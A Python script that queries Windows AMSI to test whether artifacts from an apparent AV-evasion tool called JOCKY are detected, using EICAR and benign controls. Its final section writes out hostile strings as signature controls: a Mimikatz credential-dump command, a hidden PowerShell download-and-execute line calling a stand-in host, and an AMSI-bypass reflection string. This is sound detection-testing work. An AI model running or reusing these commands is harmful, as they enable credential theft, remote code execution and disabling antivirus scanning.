"""Ask AMSI directly: would it detect a JOCKY artifact, and does Python call it?

Read-only. AmsiInitialize/AmsiScanBuffer/AmsiUninitialize are scanning APIs; they
modify nothing. The EICAR buffer is the positive control: if AMSI returns CLEAN
for EICAR, the harness is broken and the artifact result means nothing.

This answers a question the evasion evaluation otherwise has to assume: JOCKY's
own claim is "no stable byte signature". AMSI is the interface an AV uses to ask
exactly that, so calling it ourselves is the most direct measurement available.
"""
import ctypes
import glob
import os

AMSI_RESULT_CLEAN = 0
AMSI_RESULT_NOT_DETECTED = 1
AMSI_RESULT_DETECTED = 0x8000


def result_name(code: int) -> str:
    if code == AMSI_RESULT_CLEAN:
        return "CLEAN"
    if code == AMSI_RESULT_NOT_DETECTED:
        return "NOT_DETECTED"
    if code == AMSI_RESULT_DETECTED:
        return "DETECTED"
    if 0x4000 <= code <= 0x4FFF:
        return "BLOCKED_BY_ADMIN"
    return f"OTHER(0x{code:x})"


def scan(amsi, context, data: bytes, label: str) -> str:
    result = ctypes.c_uint(0)
    status = amsi.AmsiScanBuffer(
        context,
        data,
        ctypes.c_uint(len(data)),
        label,
        None,
        ctypes.byref(result),
    )
    if status != 0:
        return f"hr=0x{status & 0xFFFFFFFF:x}"
    return f"{result_name(result.value)}"


amsi = ctypes.WinDLL("amsi", use_last_error=True)
amsi.AmsiInitialize.argtypes = [ctypes.c_wchar_p, ctypes.POINTER(ctypes.c_void_p)]
amsi.AmsiInitialize.restype = ctypes.c_long
amsi.AmsiScanBuffer.argtypes = [
    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint,
    ctypes.c_wchar_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint)]
amsi.AmsiScanBuffer.restype = ctypes.c_long
amsi.AmsiUninitialize.argtypes = [ctypes.c_void_p]

context = ctypes.c_void_p()
hr = amsi.AmsiInitialize("jocky-evasion-eval", ctypes.byref(context))
print(f"AmsiInitialize hr=0x{hr & 0xFFFFFFFF:x} context={'ok' if context.value else 'NULL'}")
if hr != 0 or not context.value:
    raise SystemExit("AMSI unavailable; nothing below would be meaningful")

try:
    # --- positive control -------------------------------------------------
    eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    print(f"\n[control] EICAR ({len(eicar)} bytes)          -> {scan(amsi, context, eicar, 'eicar.com')}")

    # --- benign control ---------------------------------------------------
    benign = b"print('hello world')\n"
    print(f"[control] benign python ({len(benign)} bytes) -> {scan(amsi, context, benign, 'hello.py')}")

    # --- the real question ------------------------------------------------
    print()
    artifacts = sorted(glob.glob("art*.build"))
    verdicts = {}
    for path in artifacts:
        with open(path, "rb") as fh:
            data = fh.read()
        verdict = scan(amsi, context, data, os.path.basename(path))
        verdicts.setdefault(verdict, []).append(os.path.basename(path))
    print(f"JOCKY artifacts scanned: {len(artifacts)}")
    for verdict, names in sorted(verdicts.items()):
        print(f"  {verdict}: {len(names)} ({', '.join(names[:4])}{'...' if len(names) > 4 else ''})")

    # --- the source form --------------------------------------------------
    print()
    for path in sorted(glob.glob("*.jky"))[:4]:
        with open(path, "rb") as fh:
            data = fh.read()
        print(f"  {os.path.basename(path):28s} ({len(data)} bytes) -> "
              f"{scan(amsi, context, data, os.path.basename(path))}")

    # --- a deliberately suspicious string, to prove AMSI is really looking --
    print()
    # A generic "suspicious" pattern is NOT a valid control: it was
    # NOT_DETECTED on this host, which showed AMSI here is signature-driven
    # rather than heuristic. The controls that follow use strings with actual
    # signatures, so "NOT_DETECTED" for an artifact means "no signature
    # matched", not "nothing was examined".
    controls = {
        "mimikatz-style (heavily signatured)":
            b"Invoke-Mimikatz -DumpCreds; sekurlsa::logonpasswords",
        "meterpreter-style":
            b"powershell -nop -w hidden -c IEX(New-Object Net.WebClient)"
            b".DownloadString('http://198.51.100.7/p.ps1')",
        "amsi-bypass style (AmsiScanBuffer patch)":
            b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
            b".GetField('amsiInitFailed','NonPublic,Static')",
    }
    for label, blob in controls.items():
        print(f"[control] {label:46s} -> {scan(amsi, context, blob, 'control.txt')}")
finally:
    amsi.AmsiUninitialize(context)
    print("\nAmsiUninitialize done")
